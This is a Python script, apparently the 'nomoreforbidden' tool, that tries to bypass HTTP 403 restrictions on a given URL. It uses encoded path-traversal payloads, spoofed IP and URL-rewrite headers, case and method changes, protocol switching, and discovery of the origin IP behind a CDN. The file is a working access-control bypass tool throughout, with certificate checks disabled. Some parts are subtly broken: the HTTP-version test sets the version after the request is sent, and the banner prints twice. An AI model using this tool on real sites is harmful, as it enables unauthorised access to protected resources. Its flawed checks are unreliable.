import requests
import json
import urllib3
import argparse
import socket
from urllib.parse import urlparse
from random import choice
from requests.exceptions import RequestException, SSLError

urllib3.disable_warnings()

# Argparse
au = argparse.ArgumentParser()
au.add_argument("-u", "--url", required=True, help="Write URL")
au.add_argument("-i", "--ip", required=False, help="Write IP Adress", default="127.0.0.1")
au.add_argument("-v", "--verbose", required=False, help="Verbose on/off", default="off")
args = au.parse_args()
url = args.url
ip = args.ip
verbose = args.verbose
path = urlparse(url).path
parsed = urlparse(url).scheme + "://" + urlparse(url).netloc
# Argparse

def nmf(url):
    global response
    payloads = ["/", "/*", "/%2f/", "/./", "/./.", "/*/", "?", "??", "&", "#", "%", "%20", "%09", "/..;/", "/../",
                "/..%2f", "/..;/", "/.././", "/..%00/", "/..%0d", "/..%5c", "/..%ff/", "/%2e%2e%2f/", "/.%2e/", "/%3f",
                "%26", "%23", ".json"]
    for payload in payloads:
        bypassreq = url + payload
        try:
            urlbypass = requests.get(bypassreq, allow_redirects=False, verify=False, timeout=5)
            parsedresponse = requests.get(parsed)
            parsedlen = len(parsedresponse.content)
            reqlen = len(urlbypass.content)
            if verbose == "on":
                if urlbypass.status_code == 200 or urlbypass.status_code == 302:
                    if parsedlen == reqlen:
                        print(f'{bypassreq} [{str(urlbypass.status_code)}] Possible False Positive')
                    else:
                        print(f'{bypassreq} [{str(urlbypass.status_code)}]')
                else:
                    print(f'{bypassreq} [{str(urlbypass.status_code)}]')
            else:
                if urlbypass.status_code == 200 or urlbypass.status_code == 302:
                    if parsedlen == reqlen:
                        print(f'{bypassreq} [{str(urlbypass.status_code)}] Possible False Positive')
                    else:
                        print(f'{bypassreq} [{str(urlbypass.status_code)}]')
        except RequestException as e:
            if verbose == "on":
                print(f"Error with payload {payload}: {str(e)}")

    headers = ["X-Forwarded-Host", "X-Custom-IP-Authorization", "X-Forwarded-For"]
    for header in headers:
        try:
            response = requests.get(url, allow_redirects=False, verify=False, headers={header: ip})
            if verbose == "on":
                print(f'{header} [{str(response.status_code)}]')
            else:
                if response.status_code == 200 or response.status_code == 302:
                    print(f'{header} [{str(response.status_code)}] Ip={ip}')
        except RequestException as e:
            if verbose == "on":
                print(f"Error with header {header}: {str(e)}")

    headers = ["X-Original-URL", "X-Rewrite-URL"]
    for header in headers:
        try:
            response = requests.get(parsed, allow_redirects=True, verify=False, headers={header: path})
            parsedresponse = requests.get(parsed)
            parsedlen = len(parsedresponse.content)
            responselen = len(response.content)
            if verbose == "on":
                if response.status_code == 200 or response.status_code == 302:
                    if parsedlen == responselen:
                        print(f'{header} [{str(response.status_code)}] Possible False Positive')
                    else:
                        print(f'{header} [{str(response.status_code)}]')
            else:
                if response.status_code == 200 or response.status_code == 302:
                    if parsedlen == responselen:
                        print(f'{header} [{str(response.status_code)}] Possible False Positive')
                    else:
                        print(f'{header} [{str(response.status_code)}]')
        except RequestException as e:
            if verbose == "on":
                print(f"Error with header {header}: {str(e)}")

    try:
        req = (''.join(choice((str.upper, str.lower))(char) for char in path))
        newurl = parsed + req
        response = requests.get(newurl)
        if verbose == "on":
            print(f'Uppercase Result [{response.status_code}] Changed URL [{newurl}]')
        else:
            if response.status_code == 200 or response.status_code == 302:
                print(f'Uppercase Result [{response.status_code}] Changed URL [{newurl}]')

        response = requests.post(newurl)
        if verbose == "on":
            print(f'Post Request Result [{response.status_code}]')
        else:
            if response.status_code == 200 or response.status_code == 302:
                print(f'Post Request Result [{response.status_code}]')
    except RequestException as e:
        if verbose == "on":
            print(f"Error with changed URL {newurl}: {str(e)}")

def wayback(url):
    wayback = "https://archive.org/wayback/available?url=" + url
    try:
        waybackreq = requests.get(wayback)
        jsonreq = json.loads(waybackreq.content)
        if verbose == "on":
            try:
                print("Wayback History Found " + "[" + jsonreq['archived_snapshots']['closest']['url'] + "]")
            except:
                print("Wayback history not found")
        else:
            try:
                print("Wayback History Found " + "[" + jsonreq['archived_snapshots']['closest']['url'] + "]")
            except:
                pass
    except RequestException as e:
        if verbose == "on":
            print(f"Error accessing Wayback Machine: {str(e)}")

def ssl(url):
    protocol = urlparse(url).scheme
    if protocol == "http":
        url = url.replace("http", "https")
    else:
        url = url.replace("https", "http")

    try:
        response = requests.get(url, verify=False)
        if verbose == "on":
            print(f'Protocol Change Result [{response.status_code}] Changed Protocol [{urlparse(url).scheme.upper()}]')

        else:
            if response.status_code == 200 or response.status_code == 302:
                print(f'Protocol Change Result [{response.status_code}] Changed Protocol [{urlparse(url).scheme.upper()}]')
                
    except requests.exceptions.SSLError as e:
        if verbose == "on":
            print(f"SSL error occurred: {str(e)}")
        pass
    except requests.exceptions.RequestException as e:
        if verbose == "on":
            print(f"An error occurred: {str(e)}")
        pass

def httpv(url):
    original_version = None
    try:
        response = requests.get(url, verify=False)
        original_version = response.raw.version
    except:
        pass

    if verbose == "on":
        print(f"Original HTTP version: {original_version}")

    versions_to_test = [10, 11, 20]  # HTTP/1.0, HTTP/1.1, HTTP/2
    for version in versions_to_test:
        if version != original_version:
            try:
                response = requests.get(url, verify=False, allow_redirects=False, headers={'Connection': 'close'})
                response.raw.version = version

                if response.status_code in [200, 302]:
                    print(f"HTTP/{version/10} request successful [{response.status_code}]")
                elif verbose == "on":
                    print(f"HTTP/{version/10} request: [{response.status_code}]")
            except:
                if verbose == "on":
                    print(f"Failed to test HTTP/{version/10}")

def get_ip(url):
    domain = urlparse(url).netloc
    try:
        ip_address = socket.gethostbyname(domain)
        if verbose == "on":
            print(f"Original Domain: {domain}")
            print(f"IP Address: {ip_address}")

        ip_url = f"{urlparse(url).scheme}://{ip_address}{urlparse(url).path}"

        try:
            response = requests.get(ip_url, headers={'Host': domain}, verify=False, timeout=5)

            if 'Server' in response.headers:
                server = response.headers['Server'].lower()
                if 'cloudflare' in server or 'cloudfront' in server:
                    print(f"CDN detected ({server}) - Not Origin IP")
                else:
                    print_response(ip_url, response.status_code)
            else:
                print_response(ip_url, response.status_code)

        except SSLError:
            print("CDN/WAF detected - SSL handshake failed")
        except RequestException as e:
            if 'SSLError' in str(e):
                print("CDN/WAF detected - SSL handshake failed")
            elif verbose == "on":
                print(f"Request Error: {str(e)}")

    except socket.gaierror:
        if verbose == "on":
            print(f"Could not resolve IP for domain: {domain}")

def print_response(url, status_code):
    if verbose == "on":
        print(f"IP URL: {url}")
        print(f"Status Code: {status_code}")
    else:
        if status_code == 200 or status_code == 302:
            print(f"IP URL: {url} [{status_code}]")
            
banner = """
.__   __. .___  ___.  _______ 
|  \\ |  | |   \\/   | |   ____|
|   \\|  | |  \\  /  | |  |__   
|  . `  | |  |\\/|  | |   __|  
|  |\\   | |  |  |  | |  |     
|__| \\__| |__|  |__| |__|     v0.2 github.com/akinerk/nomoreforbidden
"""

if __name__ == "__main__":
    print(banner)

if __name__ == '__main__':
    print(banner)
    nmf(url)
    wayback(url)
    ssl(url)
    httpv(url)
    get_ip(url)
